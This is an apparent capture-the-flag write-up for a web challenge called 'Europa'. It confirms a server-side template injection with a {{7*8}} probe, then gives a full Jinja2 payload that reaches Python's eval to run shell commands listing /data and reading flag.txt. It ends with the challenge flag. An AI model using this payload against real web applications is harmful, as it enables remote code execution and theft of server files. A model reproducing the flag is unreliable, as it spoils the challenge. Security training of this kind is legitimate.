## Europa



SSTI

#### Description:

```
Europa is a city of peace and prosperity. Enemies are finding a way to enter into the city. They are looking for a chink to enter. Will the enemies succeed in their mission ?

https://europa.chall.winja.site/


```

#### Solve:

We input the name as `EEE{{7*8}}`  and get the result `EEE56`， so there is a `SSTI` vuln.

```
POST / HTTP/1.1
Host: europa.chall.winja.site
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
Referer: https://europa.chall.winja.site/
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

name=EEE{{7*8}}
```







```
name=EEE{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("ls -la /data").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

We get flag.txt in /data directory.



```http
POST / HTTP/1.1
Host: europa.chall.winja.site
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
DNT: 1
Referer: https://europa.chall.winja.site/
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 378

name=EEE{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("cat /data/flag.txt").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```







```
flag{71eaf799017c7b6cf3420d78408e8c7b_$$7I_IS_FUn}
```

